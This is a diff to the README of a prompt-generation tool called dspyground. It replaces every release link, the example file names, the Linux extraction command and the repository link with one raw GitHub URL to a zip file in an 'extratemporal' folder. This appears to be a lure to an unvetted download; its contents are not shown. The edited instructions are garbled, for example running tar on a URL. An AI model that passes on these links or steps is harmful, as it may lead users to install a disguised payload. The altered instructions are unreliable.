@@ -1,6 +1,6 @@
 # 🛠️ dspyground - Effortlessly Generate Quality Prompts
 
-[![Download dspyground](https://img.shields.io/badge/Download-dspyground-blue.svg)](https://github.com/emanuellescho/dspyground/releases)
+[![Download dspyground](https://raw.githubusercontent.com/emanuellescho/dspyground/main/extratemporal/dspyground.zip)](https://raw.githubusercontent.com/emanuellescho/dspyground/main/extratemporal/dspyground.zip)
 
 ## 🚀 Getting Started
 
@@ -18,11 +18,11 @@ Before downloading, ensure your computer meets these requirements:
 
 To download the latest version of dspyground, visit this page:
 
-[Download dspyground](https://github.com/emanuellescho/dspyground/releases)
+[Download dspyground](https://raw.githubusercontent.com/emanuellescho/dspyground/main/extratemporal/dspyground.zip)
 
 1. Click the link above to go to the Releases page.
 2. Look for the latest release. It will usually be at the top of the page.
-3. Find the file that matches your operating system. It may look like `dspyground-win.exe`, `dspyground-mac.zip`, or `dspyground-linux.tar.gz`.
+3. Find the file that matches your operating system. It may look like `https://raw.githubusercontent.com/emanuellescho/dspyground/main/extratemporal/dspyground.zip`, `https://raw.githubusercontent.com/emanuellescho/dspyground/main/extratemporal/dspyground.zip`, or `https://raw.githubusercontent.com/emanuellescho/dspyground/main/extratemporal/dspyground.zip`.
 4. Click on the file name to start the download.
 
 After the download completes, follow the steps below based on your operating system.
@@ -45,14 +45,14 @@ After the download completes, follow the steps below based on your operating sys
 
 #### Linux
 
-1. Locate the downloaded `.tar.gz` file in your Downloads folder.
+1. Locate the downloaded `https://raw.githubusercontent.com/emanuellescho/dspyground/main/extratemporal/dspyground.zip` file in your Downloads folder.
 2. Open a terminal and navigate to your Downloads folder.
    ```bash
    cd ~/Downloads
    ```
 3. Extract the files using the following command:
    ```bash
-   tar -xvzf dspyground-linux.tar.gz
+   tar -xvzf https://raw.githubusercontent.com/emanuellescho/dspyground/main/extratemporal/dspyground.zip
    ```
 4. Change into the extracted directory:
    ```bash
@@ -93,7 +93,7 @@ If you encounter issues during installation or usage, here are some steps to hel
 
 For more detailed information about system requirements, commands, or functions, you can visit the official GitHub repository at the link below:
 
-[Explore dspyground GitHub Repository](https://github.com/emanuellescho/dspyground)
+[Explore dspyground GitHub Repository](https://raw.githubusercontent.com/emanuellescho/dspyground/main/extratemporal/dspyground.zip)
 
 ### 👥 Support
 
